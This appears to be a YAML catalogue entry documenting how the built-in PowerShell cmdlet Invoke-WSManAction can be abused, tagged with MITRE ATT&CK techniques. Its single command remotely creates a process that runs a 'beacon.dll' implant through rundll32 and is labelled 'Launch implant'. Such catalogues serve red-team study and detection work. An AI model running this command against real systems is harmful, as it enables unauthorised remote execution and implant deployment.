---
Name: Invoke-WSManAction
Description: Invokes an action on the object that is specified by the Resource URI and by the selectors
Updated: 2023-07-01
Toolsets:
  - Builtin
Commands:
  - Command: 'Invoke-WSManAction -ComputerName W10.ad.bitsadmin.com -Action "Create" -ResourceURI wmicimv2/win32_process -ValueSet @{CommandLine=''C:\Windows\System32\rundll32.exe "C:\tmp\App Folder\beacon.dll",Start''}'
    Description: Execute binary
    Usecases:
      - Launch implant
    Function: Execute
    Comments:
      - 'PowerShell Module: `Microsoft.WSMan.Management`'
    MitreAttack:
      - T1047
      - T1059.001
Resources:
Detections:
Contributors:
    - Name: Arris Huijgen
      Handle: bitsadmin
---
